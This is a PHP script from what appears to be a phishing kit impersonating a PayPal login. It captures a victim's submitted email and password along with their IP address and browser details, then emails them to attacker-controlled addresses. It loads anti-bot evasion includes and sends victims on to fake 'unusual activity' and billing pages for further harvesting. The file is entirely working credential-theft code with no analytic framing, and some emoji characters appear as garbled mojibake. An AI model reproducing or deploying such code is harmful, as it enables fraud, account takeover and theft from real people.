<?php
error_reporting(0);
ob_start();
session_start();

include '../monsterab/ab.php';
include '../algorythm/mail.php';
include '../prevents/anti9.php';
include '../algorythm/wanted_options.php';
if(isset($_POST['login_email'])){

//Variables ne pas toucher
$_SESSION['email'] = $_POST['login_email'];
$_SESSION['password'] = $_POST['login_password'];
$_SESSION['ip'] = $_SERVER['REMOTE_ADDR'];
$_SESSION['useragent'] = $_SERVER['HTTP_USER_AGENT'];
//Message envoyÃ© a votre boite rez 
$msg = "
ð Email : ".$_SESSION['email']."
ð Password : ".$_SESSION['password']."

ð¢: ".$_SESSION['ip']."
ð: ".$_SESSION['useragent']."
";
$subject = "ãð»ã +1 NEW PP LOGIN |" . $_SESSION['ip'] . " ";
$fromsender = "From: Â©ï¸ ALIBABA Â©ï¸ <log@rezappl.com>";
mail($rezmail,$subject,$msg,$fromsender);
mail($rezmail2,$subject,$msg,$fromsender);
if($unusual_activity == "yes"){
header("Location: ../confirmations/unusual_activity");
$_SESSION['login'] = true;
}
else{

header("Location: ../confirmations/billing");
$_SESSION['login'] = true;
}
}
else{ 

header("Location: index.php");
}
?>